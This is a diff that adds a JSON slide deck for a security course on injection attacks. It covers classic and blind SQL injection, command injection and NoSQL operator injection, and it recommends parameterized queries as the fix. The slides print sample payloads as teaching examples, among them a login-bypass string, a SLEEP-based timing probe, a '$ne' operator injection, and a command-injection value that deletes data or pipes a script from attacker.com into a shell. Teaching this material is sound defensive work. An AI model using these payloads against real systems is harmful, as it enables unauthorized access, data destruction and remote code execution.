@@ -1,0 +1,187 @@
+{
+  "id": "injection-attacks",
+  "title": "Injection Attacks",
+  "area": "security",
+  "group": "appsec",
+  "order": 3,
+  "slug": "injection-attacks",
+  "summary": "SQL, command, and NoSQL injection all share one root cause: untrusted data treated as executable code. Learn the classic and blind variants across each, why parameterization is the one fix that actually closes the class, and why ad hoc sanitizing never fully works.",
+  "level": "intermediate",
+  "slideCount": 12,
+  "estReadMinutes": 12,
+  "slides": [
+    {
+      "id": "injection-attacks-s01",
+      "order": 1,
+      "sectionTitle": "Snapshot",
+      "subTitle": null,
+      "type": "overview",
+      "markdown": "Injection is the oldest named category in the [OWASP Top 10](owasp-top-10) — it topped every edition from 2010 through 2017 — and its root cause has never changed: **untrusted data gets treated as executable code or commands instead of as data.**\n\nSQL injection is the famous case, but the same root cause drives command injection (shelling out with user input) and NoSQL injection (an operator sneaking in where a value was expected). This topic covers all three, plus the one fix — strict separation of code from data — that closes the entire class, rather than the endless list of \"dangerous characters\" that never quite covers every case.\n\nIf you remember nothing else: the fix is never smarter escaping. It's making the interpreter structurally unable to confuse data for code.",
+      "assets": [],
+      "hasCode": false,
+      "hasTable": false,
+      "estReadSeconds": 62,
+      "mcqIds": []
+    },
+    {
+      "id": "injection-attacks-s02",
+      "order": 2,
+      "sectionTitle": "What injection actually is",
+      "subTitle": null,
+      "type": "concept",
+      "markdown": "Every injection vulnerability has the same shape: a program builds a command — a SQL query, a shell command, a database operator — by **concatenating** a trusted template with **untrusted input**, and hands the result to an interpreter that can't tell where the template ends and the input begins.\n\nThe interpreter isn't broken. It's doing exactly what it's told: execute this string. The bug is that the string was built by mixing two things — code the developer wrote and data a user supplied — that the interpreter has no way to distinguish once they're concatenated into one string.\n\nThat framing is why the fix is always the same shape too: keep code and data in **separate channels** all the way to the interpreter, so there's nothing to confuse. Every variant in this topic — SQL, command, NoSQL — is a different interpreter hitting the identical structural mistake.",
+      "assets": [],
+      "hasCode": false,
+      "hasTable": false,
+      "estReadSeconds": 66,
+      "mcqIds": [
+        "injection-attacks-s02-q1"
+      ]
+    },
+    {
+      "id": "injection-attacks-s03",
+      "order": 3,
+      "sectionTitle": "SQL injection: the classic example",
+      "subTitle": null,
+      "type": "concept",
+      "markdown": "A login check built as a string:\n\n```sql\nSELECT * FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\n```\n\nSupply a username of `' OR '1'='1` and the query becomes:\n\n```sql\nSELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''\n```\n\n`'1'='1'` is always true, so the `WHERE` clause matches every row — the attacker logs in as whichever user the database returns first, often an admin, without knowing any password at all.\n\nThe attacker didn't find a bug in the login logic. They found that the login logic and the attacker's own SQL fragment share one execution channel, so a single unescaped quote lets them **close the developer's string early and open their own SQL**. Everything after that quote is attacker-controlled SQL, not data.",
+      "assets": [],
+      "hasCode": true,
+      "hasTable": false,
+      "estReadSeconds": 68,
+      "mcqIds": [
+        "injection-attacks-s03-q1"
+      ]
+    },
+    {
+      "id": "injection-attacks-s04",
+      "order": 4,
+      "sectionTitle": "Blind SQL injection: extracting data with no output",
+      "subTitle": null,
+      "type": "concept",
+      "markdown": "The classic example assumes the response leaks something — an error, extra rows, a login bypass you can observe. **Blind** SQL injection is the harder, more common case in a hardened app: the response looks identical whether the injected condition is true or false, so the attacker needs an indirect signal.\n\nTwo standard techniques:\n\n- **Boolean-based.** Inject a condition and watch for *any* observable difference — a slightly different response, a different HTTP status, a redirect vs a 200. `' AND 1=1` behaves differently from `' AND 1=2` if the app's behavior depends on the query's row count, even subtly.\n- **Time-based.** Inject a conditional delay: `' AND IF(1=1, SLEEP(5), 0)`. If the response takes 5 seconds, the condition was true. Repeat one bit of information at a time — is the first character of the admin's password hash 'a'? 'b'? — and you can exfiltrate an entire database with no visible output at all, just timing.\n\nBlind injection is slow (thousands of requests) but fully automatable, which is exactly what tools like sqlmap do.",
+      "assets": [],
+      "hasCode": false,
+      "hasTable": false,
+      "estReadSeconds": 72,
+      "mcqIds": [
+        "injection-attacks-s04-q1"
+      ]
+    },
+    {
+      "id": "injection-attacks-s05",
+      "order": 5,
+      "sectionTitle": "Command injection",
+      "subTitle": null,
+      "type": "concept",
+      "markdown": "Command injection is the same structural bug, one layer down: the interpreter is the **OS shell**, not a database.\n\nA server that resolves a hostname by shelling out:\n\n```python\nos.system(\"ping -c 1 \" + user_supplied_host)\n```\n\nA user supplying `example.com; rm -rf /data` — or on many shells, `example.com && curl attacker.com/shell.sh | sh` — gets both commands executed, because the shell treats `;` and `&&` as command separators regardless of who wrote which side of them.\n\nThis is often *more* dangerous than SQL injection because the blast radius is the whole host, not just the database: file system access, network access, the ability to install a persistent backdoor. Any code path that builds a shell command, a filename, or a subprocess argument list from user input is a candidate, including \"safe-looking\" ones like image-conversion tools or PDF generators that shell out to a CLI utility internally.",
+      "assets": [],
+      "hasCode": true,
+      "hasTable": false,
+      "estReadSeconds": 70,
+      "mcqIds": [
+        "injection-attacks-s05-q1"
+      ]
+    },
+    {
+      "id": "injection-attacks-s06",
+      "order": 6,
+      "sectionTitle": "NoSQL injection: the operator-injection variant",
+      "subTitle": null,
+      "type": "concept",
+      "markdown": "NoSQL databases don't parse SQL strings, so the SQL-specific `' OR '1'='1'` trick doesn't apply — but the same root cause shows up as a different shape: **injecting a query operator where a plain value was expected.**\n\nA MongoDB login check that trusts JSON input directly:\n\n```javascript\ndb.users.findOne({ username: req.body.username, password: req.body.password })\n```\n\nIf `req.body.password` is bound from a JSON body rather than a plain string, an attacker can send `{\"password\": {\"$ne\": null}}` instead of a string. Mongo interprets `$ne` as \"not equal,\" so the query becomes \"find a user where password is not equal to null\" — true for any user with a password set at all. No password required.\n\nThe lesson generalizes: any data store with a query language embedded in its input format (operators inside JSON, GraphQL directives, etc.) has its own injection surface, even without a single SQL keyword involved.",
+      "assets": [],
+      "hasCode": true,
+      "hasTable": false,
+      "estReadSeconds": 74,
+      "mcqIds": [
+        "injection-attacks-s06-q1"
+      ]
+    },
+    {
+      "id": "injection-attacks-s07",
+      "order": 7,
+      "sectionTitle": "The fix: parameterized queries",
+      "subTitle": null,
+      "type": "code",
+      "markdown": "The fix that closes SQL injection structurally — not by filtering, but by keeping code and data in separate channels the whole way to the database:\n\n```python\n# Vulnerable: input concatenated directly into the SQL string\nquery = \"SELECT * FROM users WHERE username = '\" + username + \"'\"\ncursor.execute(query)\n\n# Fixed: input passed as a bound parameter, never mixed into the SQL text\nquery = \"SELECT * FROM users WHERE username = %s\"\ncursor.execute(query, (username,))\n```\n\nIn the fixed version, the database driver sends the SQL *template* and the *parameter value* to the database as two separate pieces. The database parses the template first — it's already finalized as SQL before your input is ever considered — then substitutes the parameter as a literal value with no further parsing. There is no string for a stray quote to break out of, because the input never becomes part of the SQL text at all.\n\nThe same principle applies everywhere: subprocess calls should pass arguments as a list (`subprocess.run([\"ping\", \"-c\", \"1\", host])`), never as a shell string, so there's no shell metacharacter to interpret.",
+      "assets": [],
+      "hasCode": true,
+      "hasTable": false,
+      "estReadSeconds": 76,
+      "mcqIds": [
+        "injection-attacks-s07-q1"
+      ]
+    },
+    {
+      "id": "injection-attacks-s08",
+      "order": 8,
+      "sectionTitle": "An injection attack path, end to end",
+      "subTitle": null,
+      "type": "diagram",
+      "markdown": "![Attack path from a password field through string concatenation into a SQL query, showing the single point where code and data merge](assets/sql-injection-path.svg)\n\nThe diagram's point: there's exactly one place in this chain where the attack becomes possible — the concatenation step — and exactly one place a fix has to live. Input validation earlier in the chain (rejecting obviously malformed input) is useful defense-in-depth, but it's not the fix, because validation can never enumerate every payload shape across every interpreter. The fix belongs at the concatenation point, structurally removing the ability to merge code and data there at all.",
+      "assets": [
+        {
+          "alt": "Attack path from a password field through string concatenation into a SQL query, showing the single point where code and data merge",
+          "path": "assets/sql-injection-path.svg"
+        }
+      ],
+      "hasCode": false,
+      "hasTable": false,
+      "estReadSeconds": 60,
+      "mcqIds": []
+    },
+    {
+      "id": "injection-attacks-s09",
+      "order": 9,
+      "sectionTitle": "Parameterized queries vs escaping vs blocklists",
+      "subTitle": null,
+      "type": "compare",
+      "markdown": "| Approach | How it works | Why it does or doesn't hold |\n|---|---|---|\n| **Parameterized queries** | Code and data sent to the interpreter as separate channels | Structurally closes the class — nothing to escape because nothing merges |\n| **Escaping** | Encode special characters (`'` → `\\'`) before concatenating | Works only if every context and every special character is escaped correctly, every time, everywhere input is built — one missed context reopens the hole |\n| **Blocklists** | Reject input containing known-dangerous substrings (`OR`, `--`, `;`) | Breaks legitimate input (a user named O'Brien) and is trivially bypassed with encoding, case variation, or a syntax the list didn't anticipate |\n\nEscaping isn't wrong in principle — it's the correct fix in specific contexts (escaping HTML output, for instance) — but for query construction, parameterization is strictly better because it removes the need to get escaping right in the first place. Blocklists are the weakest defense on this list and should never be the *only* control.",
+      "assets": [],
+      "hasCode": false,
+      "hasTable": true,
+      "estReadSeconds": 70,
+      "mcqIds": []
+    },
+    {
+      "id": "injection-attacks-s10",
+      "order": 10,
+      "sectionTitle": "\"Sanitizing\" with ad hoc string replacement",
+      "subTitle": null,
+      "type": "pitfall",
+      "markdown": "A tempting middle ground that doesn't work: writing your own sanitizer that strips or escapes a hand-picked list of dangerous characters before concatenating.\n\n```python\n# Looks like a fix. Isn't one.\nsafe_input = user_input.replace(\"'\", \"\").replace(\";\", \"\")\nquery = \"SELECT * FROM users WHERE username = '\" + safe_input + \"'\"\n```\n\nWhy it fails in practice: different SQL dialects support different comment syntax (`--`, `#`, `/* */`), different quoting rules, and encoding tricks (URL-encoding, double-encoding, Unicode homoglyphs) that a naive replace doesn't catch. A sanitizer written against today's known attack strings is blind to tomorrow's, and the underlying string-concatenation structure — the actual bug — is still there.\n\nEvery hand-rolled sanitizer for query construction is a permanent maintenance burden with no ceiling on cleverness required to bypass it. Parameterization removes the maintenance burden entirely because there's no list to keep updating.",
+      "assets": [],
+      "hasCode": true,
+      "hasTable": false,
+      "estReadSeconds": 68,
+      "mcqIds": []
+    },
+    {
+      "id": "injection-attacks-s11",
+      "order": 11,
+      "sectionTitle": "Injection beyond the obvious entry points",
+      "subTitle": "The senior-level nuance",
+      "type": "concept",
+      "markdown": "Junior review scope: check the search box and login form for SQL injection. Senior review scope covers where the pattern hides:\n\n- **ORMs aren't automatically safe.** Most ORM methods parameterize correctly, but nearly every ORM also exposes a raw-query escape hatch (`.raw()`, `.exec()` with string interpolation) for cases the abstraction doesn't cover — and that escape hatch is exactly as vulnerable as hand-written SQL.\n- **Second-order injection.** Data that was safely parameterized on the way *in* can still be unsafely concatenated on the way *out*, if a later process reads it from the database and builds a new query or command from it without re-parameterizing.\n- **Injection through non-obvious channels** — a filename, an HTTP header the app logs and later queries against, a CSV export that's re-imported elsewhere. Anywhere a string crosses from \"data I received\" to \"command I build\" is a candidate, not just the fields a form obviously submits.\n- **Least-privilege database accounts** as defense-in-depth: even if injection succeeds, an app account that can't `DROP TABLE` or read other schemas limits the blast radius.\n\nThe unifying senior instinct: don't ask \"is this input field validated,\" ask \"every place a string crosses from data to command, anywhere in the system.\"",
+      "assets": [],
+      "hasCode": false,
+      "hasTable": false,
+      "estReadSeconds": 78,
+      "mcqIds": []
+    },
+    {
+      "id": "injection-attacks-s12",
+      "order": 12,
+      "sectionTitle": "What's next",
+      "subTitle": null,
+      "type": "concept",
+      "markdown": "Injection is the server-side, execute-as-code half of untrusted-input handling. The next topic, [Cross-Site Scripting](xss), covers the equivalent problem in the browser: untrusted data rendered as HTML or executed as script in someone else's session, with the same lesson underneath — separate code from data, this time via output encoding rather than parameterized queries.",
+      "assets": [],
+      "hasCode": false,
+      "hasTable": false,
+      "estReadSeconds": 44,
+      "mcqIds": []
+    }
+  ]
+}
